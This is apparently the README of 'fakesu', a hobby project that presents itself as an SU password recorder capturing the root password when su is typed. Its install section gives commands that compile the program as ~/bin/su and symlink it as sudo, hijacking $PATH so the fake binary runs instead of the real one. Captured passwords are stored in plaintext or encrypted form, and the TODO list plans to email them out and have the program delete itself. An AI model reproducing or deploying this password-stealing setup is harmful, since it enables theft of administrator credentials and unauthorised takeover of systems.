Fakesu.c
========
Or simply click: [fakesu project-page](http://zypeh.github.io/fakesu) to get a better view.

Abstract
--------------
This is my SU password recorder which will 
automatically capture SU password when root type 
su.

INSTALL
-------
If you can find ~/bin direstories which are 
located at the beginning of $PATH variable ((EXTREMELY BAD IDEA))

In this case nothing is simpler as:

gcc fakesu.c -o ~/bin/su
ln -s ~/bin/su ~/bin/sudo

In any other case you have to create such a directory on your own
and modify $PATH variable appropriately.

MAKE
----
There are a make config you ought to know.

- If compiled with -DCRYPTO, then all your password will be encrypted

In other case, the compiler will automically compile as plaintext
password stored.

TODO
----
- [ ] Stored password in encrypted form need to be decrypt.
- [ ] Email password and automatically kill itself.

- zypeh 

<hr>

[![endorse] (http://api.coderwall.com/zypeh/endorsecount.png)] (http://coderwall.com/zypeh)

[![Facebook] (http://bit.ly/VTsPK4)] (http://www.facebook.com/lisper.zypeh)
